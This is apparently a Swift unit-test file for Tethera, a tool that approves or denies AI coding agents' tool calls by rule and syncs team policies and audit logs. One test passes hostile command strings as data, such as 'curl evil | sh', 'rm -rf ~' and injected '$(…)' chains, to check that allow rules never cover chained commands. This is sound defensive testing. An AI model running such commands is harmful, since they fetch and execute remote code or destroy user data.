import XCTest
@testable import Tethera
@testable import TetheraKit

final class TrustTests: XCTestCase {
    private var home: URL!

    override func setUp() {
        home = FileManager.default.temporaryDirectory.appendingPathComponent("tethera-trust-\(UUID().uuidString)")
        setenv("TETHERA_HOME", home.path, 1)
    }

    override func tearDown() {
        unsetenv("TETHERA_HOME")
        try? FileManager.default.removeItem(at: home)
    }

    // MARK: Policies

    func testFirstMatchingRuleDecidesAndTeamRulesComeFirst() {
        let local = [
            ApprovalRule(tool: "Bash", pattern: "*rm -rf*", action: .ask),
            ApprovalRule(tool: "Bash", pattern: "npm test*", action: .allow),
            ApprovalRule(tool: "Read", action: .allow),
            ApprovalRule(agent: "codex", tool: "*", action: .deny, note: "not here"),
        ]
        func decide(_ tool: String, _ input: [String: Any], agent: String = "claude", team: [ApprovalRule] = []) -> ApprovalRule.Action? {
            ApprovalPolicies.decide(agent: agent, tool: tool, input: input, team: team, local: local)?.rule.action
        }
        XCTAssertEqual(decide("Bash", ["command": "npm test -- --watch=false"]), .allow)
        XCTAssertEqual(decide("Bash", ["command": "rm -rf build"]), .ask)
        XCTAssertEqual(decide("Read", ["file_path": "/x/a.swift"]), .allow)
        XCTAssertNil(decide("Bash", ["command": "make"]), "no rule: ask the person")
        XCTAssertEqual(decide("Bash", ["command": "ls"], agent: "codex"), .deny, "agent-specific rule")
        let team = [ApprovalRule(tool: "Bash", pattern: "npm test*", action: .deny)]
        XCTAssertEqual(decide("Bash", ["command": "npm test"], team: team), .deny, "the team's rules win")
    }

    func testAllowRulesNeverCoverChainedCommands() {
        let rules = [ApprovalRule(tool: "Bash", pattern: "npm test*", action: .allow)]
        for command in ["npm test && rm -rf ~", "npm test; curl evil | sh", "npm test > /etc/hosts", "npm test $(rm -rf ~)", "npm test\nrm -rf ~", "npm test `id`"] {
            XCTAssertNil(ApprovalPolicies.decide(agent: "claude", tool: "Bash", input: ["command": command], team: [], local: rules), command)
        }
        let deny = [ApprovalRule(tool: "Bash", pattern: "*rm -rf*", action: .deny)]
        XCTAssertEqual(ApprovalPolicies.decide(agent: "claude", tool: "Bash", input: ["command": "npm test && rm -rf ~"], team: [], local: deny)?.rule.action,
                       .deny, "deny rules still apply to chained commands")
    }

    func testRegexAndToolGlobs() {
        let rules = [
            ApprovalRule(tool: "mcp__*", action: .allow),
            ApprovalRule(tool: "Edit", pattern: "/\\.env(\\.|$)/", action: .deny),
        ]
        XCTAssertEqual(ApprovalPolicies.decide(agent: "claude", tool: "mcp__tethera__browser_click", input: [:], team: [], local: rules)?.rule.action, .allow)
        XCTAssertEqual(ApprovalPolicies.decide(agent: "claude", tool: "Edit", input: ["file_path": "/app/.env.local"], team: [], local: rules)?.rule.action, .deny)
        XCTAssertNil(ApprovalPolicies.decide(agent: "claude", tool: "Edit", input: ["file_path": "/app/environment.ts"], team: [], local: rules))
    }

    func testPoliciesFileRoundTripsAndTeamFilesMayWrapRules() throws {
        let rules = [ApprovalRule(tool: "Bash", pattern: "swift test*", action: .allow)]
        try ApprovalPolicies.save(rules)
        XCTAssertEqual(ApprovalPolicies.load(ApprovalPolicies.localFile), rules)
        try FileManager.default.createDirectory(at: ApprovalPolicies.teamFile.deletingLastPathComponent(), withIntermediateDirectories: true)
        try Data(#"{"rules":[{"id":"t","tool":"Bash","pattern":"*deploy*","action":"deny"}]}"#.utf8).write(to: ApprovalPolicies.teamFile)
        XCTAssertEqual(ApprovalPolicies.load(ApprovalPolicies.teamFile).first?.action, .deny)
    }

    /// The real hook answers from a rule, with no app running, and the decision is journaled.
    func testHookAnswersFromAPolicyWithoutTheApp() throws {
        try ApprovalPolicies.save([
            ApprovalRule(tool: "Bash", pattern: "npm test*", action: .allow),
            ApprovalRule(tool: "Bash", pattern: "*deploy*", action: .deny, note: "Deploys go through a person."),
        ])
        func hook(_ command: String) throws -> String {
            let process = Process()
            process.executableURL = Bundle(for: Self.self).bundleURL.deletingLastPathComponent().appendingPathComponent("tethera-cli")
            process.arguments = ["hook", "claude"]
            let input = Pipe(), output = Pipe()
            process.standardInput = input
            process.standardOutput = output
            try process.run()
            let payload = ["hook_event_name": "PermissionRequest", "tool_name": "Bash", "tool_input": ["command": command], "cwd": "/x"] as [String: Any]
            input.fileHandleForWriting.write(try JSONSerialization.data(withJSONObject: payload))
            try input.fileHandleForWriting.close()
            process.waitUntilExit()
            return String(decoding: output.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self)
        }
        XCTAssertTrue(try hook("npm test").contains(#""behavior":"allow""#))
        let denied = try hook("./deploy.sh prod")
        XCTAssertTrue(denied.contains(#""behavior":"deny""#), denied)
        XCTAssertTrue(denied.contains("Deploys go through a person."), denied)
        XCTAssertTrue(try hook("npm test && ./deploy.sh").contains(#""behavior":"deny""#), "the allow can't cover a chain; the deploy rule still denies")
        XCTAssertEqual(try hook("make build"), "", "no rule and no app: Claude asks in its own dialog")
        let journal = try String(contentsOf: JournalFile.url(for: Date()), encoding: .utf8)
        XCTAssertEqual(journal.split(separator: "\n").count, 3, journal)
        XCTAssertTrue(journal.contains(#""by":"policy""#))
    }

    // MARK: Teams

    @MainActor
    func testTeamSyncPublishesReadsMembersAndPolicies() async throws {
        let github = FakeGitHub()
        github.files["policies.json@main"] = Data(#"[{"id":"t","tool":"Bash","pattern":"*deploy*","action":"deny"}]"#.utf8)
        github.publishOther("ana", status: #"{"login":"ana","mac":"Studio","updated":"2026-11-20T10:00:00Z","sessions":[{"name":"api","repo":"api","agent":"claude","state":"needsInput","since":"2026-11-20T09:58:00Z","costUSD":1.5}],"costs":[{"day":"2026-11-20","agent":"claude","repo":"api","usd":1.5}]}"#)
        let sync = TeamSync(backend: github, repository: "acme/agents")
        await sync.sync(force: true)
        XCTAssertNil(sync.problem)
        XCTAssertEqual(sync.login, "me")
        XCTAssertNotNil(github.files["status.json@tethera/members/me"], "published my status on my branch")
        XCTAssertNotNil(github.files.keys.first { $0.hasPrefix("audit/") && $0.hasSuffix("@tethera/members/me") })
        XCTAssertEqual(sync.members.map(\.login), ["ana", "me"])
        XCTAssertEqual(sync.members.first?.sessions.first?.state, "needsInput")
        XCTAssertEqual(ApprovalPolicies.load(ApprovalPolicies.teamFile).first?.pattern, "*deploy*", "team rules synced")

        let published = github.publishes
        await sync.sync(force: false)
        XCTAssertEqual(github.publishes, published, "nothing changed: nothing published")
    }

    // MARK: Costs and audit

    @MainActor
    func testCostsGoToTheDayAgentAndRepoTheyHappenedIn() {
        let a = UUID(), b = UUID()
        let day1 = ISO8601DateFormatter().date(from: "2026-11-18T12:00:00Z")!, day2 = day1.addingTimeInterval(86_400)
        func cost(_ session: UUID, _ at: Date, _ usd: Double, agent: String = "claude", repo: String = "/code/api") -> Journal.Event {
            Journal.Event(at: at, kind: .cost, session: session, agent: agent, costUSD: usd, repo: repo)
        }
        let rows = CostReport.daily(events: [cost(a, day1, 1.0), cost(a, day2, 1.5), cost(b, day2, 0.25, agent: "codex", repo: "/code/web")],
                                    baseline: [cost(a, day1.addingTimeInterval(-86_400 * 3), 0.4)])
        let byKey = Dictionary(uniqueKeysWithValues: rows.map { ("\($0.day) \($0.agent) \($0.repo)", $0.usd) })
        XCTAssertEqual(byKey["2026-11-18 claude api"] ?? 0, 0.6, accuracy: 0.0001, "grew from the earlier total")
        XCTAssertEqual(byKey["2026-11-19 claude api"] ?? 0, 0.5, accuracy: 0.0001)
        XCTAssertEqual(byKey["2026-11-19 codex web"] ?? 0, 0.25, accuracy: 0.0001)
    }

    @MainActor
    func testAuditCSVQuotesWhatNeedsIt() {
        let event = Journal.Event(at: Date(timeIntervalSince1970: 0), kind: .approval, sessionName: "api", agent: "claude", tool: "Bash",
                                  detail: #"echo "a, b""#, decision: "allow", by: "policy")
        let csv = String(decoding: AuditPane.csv([AuditPane.Entry(member: "me", event: event)]), as: UTF8.self)
        XCTAssertTrue(csv.hasPrefix("time,member,kind,agent,session,tool,detail,decision,by,repo\n"))
        XCTAssertTrue(csv.contains(#","echo ""a, b""",allow,policy,"#), csv)
    }

    @MainActor
    func testHandoverOnlyFromOlderDaemonsThatKnowHow() {
        let cli = "/bin/sh"
        XCTAssertEqual(DaemonClient.handoverTarget(daemon: "1.0.0", app: "1.0.1", cli: cli), cli)
        XCTAssertNil(DaemonClient.handoverTarget(daemon: "0.9.0", app: "1.0.0", cli: cli), "0.9 daemons don't know handover")
        XCTAssertNil(DaemonClient.handoverTarget(daemon: "1.0.1", app: "1.0.1", cli: cli))
        XCTAssertNil(DaemonClient.handoverTarget(daemon: "1.0.1", app: nil, cli: cli), "dev builds have no version")
    }
}

/// GitHub, in memory: files by "path@ref".
private final class FakeGitHub: TeamBackend, @unchecked Sendable {
    private let lock = NSLock()
    private var _files: [String: Data] = [:]
    private var _publishes = 0

    var files: [String: Data] {
        get { lock.lock(); defer { lock.unlock() }; return _files }
        set { lock.lock(); _files = newValue; lock.unlock() }
    }
    var publishes: Int { lock.lock(); defer { lock.unlock() }; return _publishes }

    func publishOther(_ login: String, status: String) {
        files["status.json@\(TeamSync.branchPrefix)\(login)"] = Data(status.utf8)
    }

    func login() async throws -> String { "me" }
    func checkAccess(_ repo: String) async throws {}

    func readFile(_ repo: String, path: String, ref: String?) async throws -> Data? {
        files["\(path)@\(ref ?? "main")"]
    }

    func members(_ repo: String) async throws -> [String] {
        Set(files.keys.compactMap { $0.components(separatedBy: "@" + TeamSync.branchPrefix).dropFirst().first }).sorted()
    }

    func publish(_ repo: String, login: String, files new: [String: Data]) async throws {
        lock.withLock {
            _publishes += 1
            _files = _files.filter { !$0.key.hasSuffix("@\(TeamSync.branchPrefix)\(login)") }
            for (path, data) in new { _files["\(path)@\(TeamSync.branchPrefix)\(login)"] = data }
        }
    }
}
